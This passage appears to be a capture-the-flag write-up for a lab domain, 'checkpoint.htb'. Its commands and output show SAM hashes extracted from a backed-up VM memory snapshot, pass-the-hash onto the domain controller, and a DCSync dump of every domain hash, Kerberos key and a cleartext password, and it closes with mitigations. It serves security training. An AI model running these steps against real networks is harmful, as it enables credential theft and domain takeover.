smb: \NightlyBackup_2024-11-01\memory forensics\> ls
  .                                   D        0  Sat May  9 22:12:44 2026
  ..                                  D        0  Sat May  9 21:54:19 2026
  Windows Server 2019-000001.vmdk      A 106496000  Sun May 10 07:45:22 2026
  Windows Server 2019-Snapshot1.vmem      A 2147483648  Sun May 10 07:40:36 2026
  Windows Server 2019-Snapshot1.vmsn      A 138164859  Sun May 10 07:40:36 2026
  Windows Server 2019.nvram           A   270840  Sun May 10 07:39:00 2026
  Windows Server 2019.scoreboard      A     7642  Sun May 10 07:45:22 2026
  Windows Server 2019.vmdk            A 10199695360  Sun May 10 07:39:00 2026
  Windows Server 2019.vmsd            A      502  Sun May 10 07:39:00 2026
  Windows Server 2019.vmx             A     2749  Sun May 10 07:45:22 2026
  Windows Server 2019.vmxf            A      274  Sun May 10 07:22:44 2026

                10459391 blocks of size 4096. 2315519 blocks available               
```

The backup folder contains virtual machine snapshot files from a Windows Server 2019 VM. We download the VM's memory file (`Windows Server 2019-Snapshot1.vmem`), which has a size of 2 GB:

```
smb: \NightlyBackup_2024-11-01\memory forensics\>  get "Windows Server 2019-Snapshot1.vmem"
getting file \NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem of size 2147483648 as Windows Server 2019-Snapshot1.vmem (2745.3 KiloBytes/sec) (average 2745.3 KiloBytes/sec)
```

### Forensic Memory Analysis using Volatility 3

#### Tool Overview: Volatility 3
Volatility 3 is the standard framework for extracting digital artifacts from volatile memory (RAM) dumps. By analyzing standard structure formats and symbols associated with specific operating system kernels, it reconstructs processes, registry configurations, network sockets, and file objects offline without executing code on the target.

#### Understanding Volatile Memory Forensics
Volatile memory (RAM) contains active states of running systems, including data that is never written to disk or is only resident in decrypted formats. When a hypervisor takes a virtual machine snapshot, it saves this active state to a `.vmem` physical memory dump. Forensic analysis of this file allows us to inspect decryptions, credentials, and configurations in their active, decrypted states.

#### Breakdown of Volatility 3 Plugins and Analysis Logic
- **`windows.info`**: Analyzes the memory dump to identify the operating system kernel version, CPU architecture, and kernel base address.
  - **Directory Table Base (DTB)**: Identifies the physical address of the page directory for translation of virtual to physical memory spaces.
  - **Symbol Resolution (`ntkrnlmp.pdb`)**: Volatility maps memory structures using Symbol Tables (`PDB` files) matching the target's operating system build. These symbol tables act as headers, providing the exact offsets of internal Windows kernel structures (like process lists and registry handles) inside the raw memory map.
- **`windows.registry.hivelist`**: Scans the memory space looking for Active Directory configuration manager registry structures (known as `_CMHIVE` structures). This maps the exact virtual address offsets of registry hives such as `SAM`, `SYSTEM`, `SECURITY`, `SOFTWARE`, and individual user `NTUSER.DAT` files currently mapped into memory.
- **`windows.registry.hashdump`**: Locates the SAM and SYSTEM hives based on offsets mapped in the hivelist.
  - **Offline Registry Hive Decryption**: The SAM database hashes are encrypted using a system bootkey (syskey). The plugin extracts the bootkey from the LSA secrets structure in the SYSTEM hive, reads the obfuscated hashes from the SAM hive, and runs the decryption routines offline to dump local user NTLM hashes.
  - **Dependencies**: The plugin relies on `pycryptodome` to perform the legacy DES and AES decryption routines necessary to decrypt the SAM database, and `yara-x` to scan memory zones for specific signatures.

#### Abuse Path: Offline Registry Hive Extraction
Virtual machine snapshot files (specifically `.vmem` files containing physical RAM state) contain a wealth of sensitive data, including password hashes stored in registry hives. If an attacker can access snapshot backup folders:
1. They can download the raw memory map.
2. Using memory forensics tools, they scan memory zones to locate offsets corresponding to the **SAM** and **SYSTEM** registry hives.
3. They extract the bootkey configuration from the SYSTEM hive to decrypt password hashes resident in the SAM hive, recovering credentials offline.

We set up Volatility 3 with the required dependency libraries (`yara-x` for pattern matching and `pycryptodome` for cryptographic decryption):

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ pipx install volatility3

┌──(kali㉿kali)-[~/Pentesting/Tools/volatility3]
└─$ pipx inject volatility3 yara-x

┌──(kali㉿kali)-[~/Pentesting/Tools/volatility3]
└─$ pipx inject volatility3 pycryptodome             
```

We profile the memory capture using the `windows.info` plugin to check basic OS details and symbol matches:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ vol -f Windows\ Server\ 2019-Snapshot1.vmem windows.info
Variable        Value

Kernel Base     0xf80725608000
DTB             0x1ad000
Symbols         file:///home/kali/.local/share/pipx/venvs/volatility3/lib/python3.13/site-packages/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz
Is64Bit         True
IsPAE           False
layer_name      0 WindowsIntel32e
memory_layer    1 FileLayer
KdVersionBlock  0xf80725a08f10
Major/Minor     15.17763
MachineType     34404
KeNumberProcessors      2
SystemTime      2026-05-09 14:08:58+00:00
NtSystemRoot    C:\Windows
NtProductType   NtProductServer
NtMajorVersion  10
NtMinorVersion  0
PE MajorOperatingSystemVersion  10
PE MinorOperatingSystemVersion  0
PE Machine      34404
PE TimeDateStamp        Sun Nov 10 07:20:39 2075                                      
```

We list all the active Windows Registry hives resident in memory. We identify the virtual addresses offset for the `SAM` and `SYSTEM` hives:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ vol -f Windows\ Server\ 2019-Snapshot1.vmem windows.registry.hivelist.HiveList
Volatility 3 Framework 2.28.0
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.
Progress:  100.00               PDB scanning finished                        
Offset  FileFullPath    File output

0xc30a2fe34000          Disabled
0xc30a2fe38000  \REGISTRY\MACHINE\SYSTEM        Disabled
0xc30a2fecf000  \REGISTRY\MACHINE\HARDWARE      Disabled
0xc30a3205d000  \SystemRoot\System32\config\DRIVERS     Disabled
0xc30a32060000  \Device\HarddiskVolume2\EFI\Microsoft\Boot\BCD  Disabled
0xc30a3205b000  \SystemRoot\System32\Config\SOFTWARE    Disabled
0xc30a3278c000  \SystemRoot\System32\Config\DEFAULT     Disabled
0xc30a3278e000  \SystemRoot\System32\Config\SAM Disabled
0xc30a32789000  \SystemRoot\System32\Config\SECURITY    Disabled
0xc30a32a7c000  \??\C:\Windows\ServiceProfiles\NetworkService\NTUSER.DAT        Disabled
0xc30a32ba0000  \??\C:\Windows\ServiceProfiles\LocalService\NTUSER.DAT  Disabled
0xc30a32d1d000  \SystemRoot\System32\Config\BBI Disabled
0xc30a35390000  \??\C:\Windows\System32\config\COMPONENTS       Disabled
0xc30a37244000  \??\C:\Users\Administrator\ntuser.dat   Disabled
0xc30a36e3f000  \??\C:\Users\Administrator\AppData\Local\Microsoft\Windows\UsrClass.dat Disabled
0xc30a376a9000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.ShellExperienceHost_10.0.17763.1_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat        Disabled
0xc30a37d32000  \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy\Settings\settings.dat     Disabled
0xc30a37d03000  \??\C:\ProgramData\Microsoft\Windows\AppRepository\Packages\Microsoft.Windows.Cortana_1.11.6.17763_neutral_neutral_cw5n1h2txyewy\ActivationStore.dat    Disabled
0xc30a37d8a000  \??\C:\Users\Administrator\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\Settings\settings.dat Disabled
0xc30a323f7000  \??\C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Windows\DeliveryOptimization\State\dosvcState.dat Disabled
```

We run the `windows.registry.hashdump.Hashdump` plugin. This plugin parses the SAM database using the bootkey located in the SYSTEM hive to extract local user password hashes:

```      
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ vol -f Windows\ Server\ 2019-Snapshot1.vmem windows.registry.hashdump.Hashdump
Volatility 3 Framework 2.28.0
WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.
Progress:  100.00               PDB scanning finished                        
User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        f29e9c014295b9b32139b09a2790be3b
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        28f8d934dee90b2ec824351cb0844479
```

We extract the NTLM hash for the local Administrator account: `f29e9c014295b9b32139b09a2790be3b`.

### Domain Takeover

We test the extracted Administrator hash against the target Domain Controller `checkpoint.htb`:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ netexec smb $ip -u Administrator -H f29e9c014295b9b32139b09a2790be3b 
SMB         10.129.36.165   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)                                                                                                                                  
SMB         10.129.36.165   445    DC01             [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
```

The local Administrator hash matches the Domain Administrator account (`(Pwn3d!)`).

We connect to the Domain Controller using `evil-winrm` (a WinRM command line execution client supporting Pass-the-Hash and file uploads/downloads) via Pass-the-Hash (PtH) to establish a shell and retrieve the root flag:

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ evil-winrm-py -u administrator -H f29e9c014295b9b32139b09a2790be3b -i $ip
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to '10.129.36.165:5985' as 'administrator'
evil-winrm-py PS C:\Users\Administrator\Documents> Get-Content C:\Users\Max.Palmer\Desktop\root.txt
1d469b9d1979105ad227cd467138faff
```

We run Impacket's `secretsdump` tool to dump all credential secrets and NT hashes from the Active Directory database (`ntds.dit`). 

#### Abuse Path: DCSync Credential Dumping
DCSync mimics the behavior of a Domain Controller. It uses the Directory Replication Service Remote Protocol (MS-DRSR) via the DRSUAPI interface to request credential replication from a Domain Controller. 

To perform DCSync, an account must have specific replication permissions:
- **`DS-Replication-Get-Changes`**
- **`DS-Replication-Get-Changes-All`**

By default, members of the Domain Admins, Enterprise Admins, and Administrators groups possess these rights. Once an attacker compromises an account with these permissions (such as the Administrator account), they can retrieve all password hashes from the Active Directory database without running tools directly on the Domain Controller.

```
┌──(kali㉿kali)-[~/HTB/AD/Checkpoint]
└─$ impacket-secretsdump checkpoint.htb/administrator@DC01.checkpoint.htb -hashes :f29e9c014295b9b32139b09a2790be3b -dc-ip $ip 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x06b0f9cc2192d10a923d27c3741323df
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CHECKPOINT\DC01$:aes256-cts-hmac-sha1-96:5f02d39019f4d07672040f0059ddab05a956b1c174e802013562690fec0f080b
CHECKPOINT\DC01$:aes128-cts-hmac-sha1-96:d26e51016d3086e4e67097017863a79c
CHECKPOINT\DC01$:des-cbc-md5:6dd364b57f58a43e
CHECKPOINT\DC01$:plain_password_hex:e294eb9b4c05e1ba6dd2ca6fb87b0ff9f45fcf1e7c35ca1244c04ac47cc7d9d5cd72d92ef7c6c6d83bc9922111b103f714a07c6901589d9a101336dfc325b6438fe1fca76bf5e4e493f4d4184ca33432bf40be772f60a54f1f31e9cfa40e2bdae004769a33c161dc1c46a052162203e3fccd835560aa2bb811a5c51257e2bcbd76a0c33d978fe23eca3998d680e6abbbb50f186f8d850a2a8348a7a0cfa06c6ebe8a637ad64e2da14c662b9241cc0852bffe974d6f251f1ad5b5bd078a7e695f97afb8432fead2f49320a228517b0186cd2d400ef9998ac91bbfdb942b7a49b2e968f84443dccfbbedf93f1fbbef161331ca2a23cd390eb79203ea951f814601a15a89745e71c3a8b26c88e46d6278b8baac5b1f6e12ee0dea324ea347b62f2c033a08af9068a1f90fa47f5a238df826783b8ae6acea08a873fb3da13aa6c1cc76a9c7daf903803a7f19dfc5a44869ffbdaa49a1388999395a0783dcd628eed29c7c54e65134c2a2be71c5b32bdc2954d2d7f0d8637261ba5534b65a4cba11e0e2719f4664afbe6ec0bb820c0b65154da29d92d064a3c1bf392d3ddff4f451cc005af98155912a6a4ad787c353d9a0f3498f065cdf359b9872e47ca1d4916540bfb5416fc2956bcca1d053033da6b1a959b69829c68745a6206a067d10642cfbb124d380b8932315107e8e37757d59ae26b9e2e9f2d7d9a5be417cf0ceb300ce
CHECKPOINT\DC01$:aad3b435b51404eeaad3b435b51404ee:cacfde2465d05d06d1d148b87643770a:::
[*] DefaultPassword 
CHECKPOINT\ryan.brooks:JOCXfSk7Y$mvjLou
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdd7a32782a6175d4f207ae61fe619e37b4e5edcd
dpapi_userkey:0xb8921a25a0d758a50c6ecf080b22d6d378ec7f38
[*] NL$KM 
 0000   73 AD 43 22 4D CC D1 B6  74 99 EC 7F 45 9C 46 03   s.C"M...t...E.F.
 0010   8F 4C BA 04 A4 CF D5 A1  95 FE 45 5B 9C 21 44 05   .L........E[.!D.
 0020   0C 46 72 24 67 1F 18 33  23 17 E0 79 1F 4E 82 17   .Fr$g..3#..y.N..
 0030   2E 8A EA 23 89 F3 DF D8  97 E0 ED C1 86 D8 31 75   ......#..........1u
NL$KM:73ad43224dccd1b67499ec7f459c46038f4cba04a4cfd5a195fe455b9c2144050c467224671f18332317e0791f4e82172e8aea2389f3dfd897e0edc186d83175
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:015e3bf70a412ef82b604fae3b1c30e8:::
checkpoint.htb\alex.turner:1101:aad3b435b51404eeaad3b435b51404ee:0b28e49d9deb96f99d74578e214faec2:::
checkpoint.htb\mark.davies:1102:aad3b435b51404eeaad3b435b51404ee:0b28e49d9deb96f99d74578e214faec2:::
checkpoint.htb\ryan.brooks:1103:aad3b435b51404eeaad3b435b51404ee:82d044eb259e495fd92a52b2ccece067:::
checkpoint.htb\svc_deploy:1104:aad3b435b51404eeaad3b435b51404ee:e16081eb077aca74bdbf8af12af43ac9:::
checkpoint.htb\james.harper:1111:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\sarah.mitchell:1112:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\emily.carter:1113:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\david.reynolds:1114:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\jessica.coleman:1115:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\lauren.flores:1116:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\michael.torres:1117:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\kevin.patterson:1118:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\brian.jenkins:1119:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
checkpoint.htb\megan.perry:1120:aad3b435b51404eeaad3b435b51404ee:72f0eefcc213ea8f350773b831cf2c9c:::
max.palmer:5101:aad3b435b51404eeaad3b435b51404ee:7d7670c154bf5439523729639c6d2f16:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:cacfde2465d05d06d1d148b87643770a:::
evil-dmsa$:7101:aad3b435b51404eeaad3b435b51404ee:3a10b94f6eec64c9ea99ebf5aae5c8c8:::
bad-dmsa$:7103:aad3b435b51404eeaad3b435b51404ee:64c14eaf428c6d9169bb87390b803eb4:::
[*] Kerberos keys grabbed
Administrator:0x14:080057b7027fc24621a1705d72cc8667b4c31cecd10c363025533cbd1dae6829
Administrator:0x13:cc8ba02031bb7aeda01eb87b372486b1
Administrator:aes256-cts-hmac-sha1-96:f2bf1e46f074f3adf44b82237f633ae230628cd84cb2e18fccfdfc3d1342e8c0
Administrator:aes128-cts-hmac-sha1-96:c51d9196283736c666d8fb03390f83fe
Administrator:0x17:f29e9c014295b9b32139b09a2790be3b
krbtgt:aes256-cts-hmac-sha1-96:502b19351580486fb84569ba9a9449b06a81c5dbd935c915329054fe5a1304a1
krbtgt:aes128-cts-hmac-sha1-96:37ca3eb59cddd5382f7f178381cd29eb
krbtgt:0x17:015e3bf70a412ef82b604fae3b1c30e8
checkpoint.htb\alex.turner:0x14:ff396ded06b749abd956e21dafc756dc4d3d00f0529d610b3c7e81a07283a3dc
checkpoint.htb\alex.turner:0x13:c0662de1a8c13316ead90c8b7af08d00
checkpoint.htb\alex.turner:aes256-cts-hmac-sha1-96:8f12ba9591f2d80d1805e1c6476f9f236928f82c6063063d8d6effc8e5bf76e4
checkpoint.htb\alex.turner:aes128-cts-hmac-sha1-96:8920be1b6619f706878758e6f753a953
checkpoint.htb\alex.turner:0x17:0b28e49d9deb96f99d74578e214faec2
checkpoint.htb\mark.davies:0x14:2ecf7a82f042fed441ac02e65ba4519370e278536325876362786b71908e0c27
checkpoint.htb\mark.davies:0x13:d3062f1cd7f92ab2432a9b4f52c24c08
checkpoint.htb\mark.davies:aes256-cts-hmac-sha1-96:3ea1453cc82ebe851f8c31c5422b12131f9496d80b3a5b3bf9aceabdf2ccf133
checkpoint.htb\mark.davies:aes128-cts-hmac-sha1-96:9617d912f7d2c306406c5c0d94ae5ca6
checkpoint.htb\mark.davies:0x17:0b28e49d9deb96f99d74578e214faec2
checkpoint.htb\ryan.brooks:0x14:356f9ec5f6c39a17b8221f25cdc302b23e384ef789d3b96e4aba504f09e60043
checkpoint.htb\ryan.brooks:0x13:71562e84b5d7ec4bcdb7ac60eda49fe8
checkpoint.htb\ryan.brooks:aes256-cts-hmac-sha1-96:545b2e59b9c2c2ed01bf5b3972a360818f88f1a35311de3eeb06277a265b9099
checkpoint.htb\ryan.brooks:aes128-cts-hmac-sha1-96:84e114ab257b544a93a2f19a48b8b1cc
checkpoint.htb\ryan.brooks:0x17:82d044eb259e495fd92a52b2ccece067
checkpoint.htb\svc_deploy:0x14:e5a62dd7107a92a9d120fdaa5aae96c0b59f1d1166d8132c7971b76dd5198526
checkpoint.htb\svc_deploy:0x13:8b0f18648cab21f3dfaf1a747792bb3a
checkpoint.htb\svc_deploy:aes256-cts-hmac-sha1-96:897691a90a0442f197f205fbd132f017d190fe63d86ca45e7640527f600c5027
checkpoint.htb\svc_deploy:aes128-cts-hmac-sha1-96:24bff90d93513d7adff3c39e7246f757
checkpoint.htb\svc_deploy:0x17:e16081eb077aca74bdbf8af12af43ac9
checkpoint.htb\james.harper:0x14:99d438c49f61dc64b1e5e82f79de72d3dd881c2ea15252127fe215aa3234f43c
checkpoint.htb\james.harper:0x13:378c133f592bf3de8de2fc3ffb539e64
checkpoint.htb\james.harper:aes256-cts-hmac-sha1-96:f2f739242e2252213ed317bb7bee4607a241157fd353ef2a9b9815b3b41715f9
checkpoint.htb\james.harper:aes128-cts-hmac-sha1-96:30d0dabf5a5f00fe62bf1b1a823a9e27
checkpoint.htb\james.harper:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\sarah.mitchell:0x14:d50e22d4e2aee3fa11959836fbb8f2af0a1569f2d76276ec9fe533eedf200002
checkpoint.htb\sarah.mitchell:0x13:a0732a196f56899cf61803fd08aff286
checkpoint.htb\sarah.mitchell:aes256-cts-hmac-sha1-96:dcb12c3564d805122b42573daba7aabb181cbef0501a0738fedf4391abb8b6af
checkpoint.htb\sarah.mitchell:aes128-cts-hmac-sha1-96:35ea77ba412456b8ccf077d62e673632
checkpoint.htb\sarah.mitchell:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\emily.carter:0x14:ee51afafeef3961f35af85badfb754734c0ad82885674b64242e9c9e58093ca7
checkpoint.htb\emily.carter:0x13:043cb59c93646dc0ce330817663f296d
checkpoint.htb\emily.carter:aes256-cts-hmac-sha1-96:e31efe7389ea5f4fe097bf89ae00e29da5506d97db12879607754ed51d15f572
checkpoint.htb\emily.carter:aes128-cts-hmac-sha1-96:0b22a7f517a7b3a5432ba7eb91cae93e
checkpoint.htb\emily.carter:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\david.reynolds:0x14:e6d1e137ea6a83ceeeb5dbf5742915f2291f28de9c0eb54911692025bf477ac0
checkpoint.htb\david.reynolds:0x13:77db51b17e241be913c308fd567c6774
checkpoint.htb\david.reynolds:aes256-cts-hmac-sha1-96:021fe6c4751b67ee4373924c6cd5a0bb77b6f5a5f389d199aac0d1c8d804feff
checkpoint.htb\david.reynolds:aes128-cts-hmac-sha1-96:cb1cc35c1f9d03245eb79cd92025dd24
checkpoint.htb\david.reynolds:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\jessica.coleman:0x14:5c97da6c4055dcd9f8b859b6685d2ee1abd73db6dd853f7a652df9978d071e90
checkpoint.htb\jessica.coleman:0x13:2a3f7254636336423afd3745fe0dfb7c
checkpoint.htb\jessica.coleman:aes256-cts-hmac-sha1-96:0401962f074b3b2bb7fe65ea1fbe524073d2ab6a978388fb8db96ebf94561428
checkpoint.htb\jessica.coleman:aes128-cts-hmac-sha1-96:bee018c9f86f57c867d3a6682712478a
checkpoint.htb\jessica.coleman:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\lauren.flores:0x14:73bcc6ec5a84505e9bac340202f4f9745f44a843622a79596b56132244cdfbff
checkpoint.htb\lauren.flores:0x13:5c054c82f2e79bed22f28edf84015383
checkpoint.htb\lauren.flores:aes256-cts-hmac-sha1-96:26603a68f73e6a4de4490c81a86d59bad9d49fecd4f58edff05260f3c8627f28
checkpoint.htb\lauren.flores:aes128-cts-hmac-sha1-96:c68accb1d359bc81e5ffd416d051cc4a
checkpoint.htb\lauren.flores:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\michael.torres:0x14:07f3bd61bc3064779b3c410b6f50748459e802f3a9c4d507857153c349e7479a
checkpoint.htb\michael.torres:0x13:6e5513acd543a0b79c2e07658a86f9b4
checkpoint.htb\michael.torres:aes256-cts-hmac-sha1-96:4d0bec36ce259b37c45fe069b62a7891e01a33cacd90b77eafa6fa348ef81ad6
checkpoint.htb\michael.torres:aes128-cts-hmac-sha1-96:7658eaa3fc9d1b134df3567d5811d8c2
checkpoint.htb\michael.torres:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\kevin.patterson:0x14:8246aa790819bbcec1c38e93d913082a519b472a0bdab7e7be1bf0682e666147
checkpoint.htb\kevin.patterson:0x13:7fb9987994fca336bce9fa905f4f6d48
checkpoint.htb\kevin.patterson:aes256-cts-hmac-sha1-96:cdae3ef919ccaa5beccecba15ba4cdab5c1cf1e0606e3a5c21098da733e93e00
checkpoint.htb\kevin.patterson:aes128-cts-hmac-sha1-96:ae0ca850873b7ef1949779cc2d3e35b9
checkpoint.htb\kevin.patterson:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\brian.jenkins:0x14:be3833b2f3499299396ce77cebd505dd18d36723b9f8fb655881c9c9d897915c
checkpoint.htb\brian.jenkins:0x13:9809dceff6ca73a25de2d5af81b1467e
checkpoint.htb\brian.jenkins:aes256-cts-hmac-sha1-96:b9db10084fa9f8f0a2e5e981948b7224624e9f58926225f1a4424d24150392a9
checkpoint.htb\brian.jenkins:aes128-cts-hmac-sha1-96:f0ae22b439e070656da6d08a172f7e2a
checkpoint.htb\brian.jenkins:0x17:72f0eefcc213ea8f350773b831cf2c9c
checkpoint.htb\megan.perry:0x14:42901b4ecb99e60b9ea3dc5471a8ae67ba043760e37069494fbc7916ff678270
checkpoint.htb\megan.perry:0x13:9008ab491f9f93e22f5150cb07ef110c
checkpoint.htb\megan.perry:aes256-cts-hmac-sha1-96:bb92914177963fa9ac778a7e98a0555397db52f6b4ee093f1eebe10023e5c7c8
checkpoint.htb\megan.perry:aes128-cts-hmac-sha1-96:b12842cb8a3bd5c5b0858e4d91871a1b
checkpoint.htb\megan.perry:0x17:72f0eefcc213ea8f350773b831cf2c9c
max.palmer:0x14:6fc2d2ce8370796ebcfcddbf7cee3d5558a7b087063e4f5ed41bbaf0a6a2a003
max.palmer:0x13:f719b2d512fc0079809f176143866ed7
max.palmer:aes256-cts-hmac-sha1-96:09c2ba488cb3b398245ee364047b9939e4d1fffc81db70a3cc79b63f3cd90dc2
max.palmer:aes128-cts-hmac-sha1-96:72a7e01b95863d5439bb46d76b2cd5df
max.palmer:0x17:7d7670c154bf5439523729639c6d2f16
DC01$:aes256-cts-hmac-sha1-96:a3caee5e33488869e4a6af9a8cba8937f6eafea7257d396d2fddb0e5da2fed8b
DC01$:aes128-cts-hmac-sha1-96:f7deede65627bc0a0c31c3a4adfdb6c5
DC01$:0x17:cacfde2465d05d06d1d148b87643770a
evil-dmsa$:aes256-cts-hmac-sha1-96:6e74e619bec2b33f1543707a941ac289e80067fa8b3068836d700731e7dfea3d
evil-dmsa$:aes128-cts-hmac-sha1-96:9d0900833121abd329208f4b3390efdd
evil-dmsa$:0x17:3a10b94f6eec64c9ea99ebf5aae5c8c8
bad-dmsa$:aes256-cts-hmac-sha1-96:b7022de8181a15ca58f7428064117a8a285ab8f9102438b27cf2d4dbfedc80f6
bad-dmsa$:aes128-cts-hmac-sha1-96:c3c392f4247fc820fd71ca59b15dc2e4
bad-dmsa$:0x17:64c14eaf428c6d9169bb87390b803eb4
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

DCSync succeeds, dumping the domain NT database containing hashes for all accounts (including `krbtgt`), establishing full persistence and control over the Active Directory forest.

---

## 7. Mitigations & Security Recommendations

To secure the environment and prevent similar compromise chains, we recommend the following mitigations:

### BadSuccessor (CVE-2025-53779) Mitigations
- **Apply Microsoft Patches**: Install the security update `KB5063878` (Build `26100.4946` or later) on all Windows Server 2025 Domain Controllers immediately. The patch requires mutual pairing references between the dMSA and predecessor account, preventing one-way mapping abuse.
- **Restrict OU permissions**: Restrict `CreateChild` rights over OUs to Domain Administrators. Low-privileged users should not be allowed to create or modify child objects (such as dMSAs).
- **Monitor Active Directory Logs**: Audit Event ID `5137` (Directory Service Object Creation) and Event ID `5136` (Directory Service Object Modification) specifically for modifications to the `msDS-ManagedAccountPrecededByLink` attribute. Monitor Kerberos Event ID `2946` on Domain Controllers.

### VS Code & SMB Share Security
- **Restrict Share Access**: Modify share permissions on `DevDrop` to limit WRITE rights strictly to authorized administrative accounts.
- **De-authorize Automated Installations**: Disable script engines or backend service workers that automatically download, install, and execute unverified packages or extensions. Implement code-signing policies for all automated deployment steps.

### Active Directory Recycle Bin & ACL Review
- **Secure the Deleted Objects Container**: Audit ACL permissions on system containers. Ensure standard accounts do not possess write or modification rights over tombstoned or deleted user objects.
- **Enforce Credential Hygiene**: Ensure distinct, high-entropy passwords for service accounts. Implement multi-factor authentication (MFA) and restrict privilege reuse patterns to prevent lateral movement.

### Backup & Snapshot Storage Security
- **Secure VM Snapshot Files**: Enforce strict NTFS permissions on shares containing virtualization backups (`.vmem`, `.vmdk`, `.vmx`). Restrict read permissions to a designated backup service account.
- **Implement Encryption**: Configure BitLocker or virtual machine encryption on snapshot directories to prevent offline registry hive extraction.
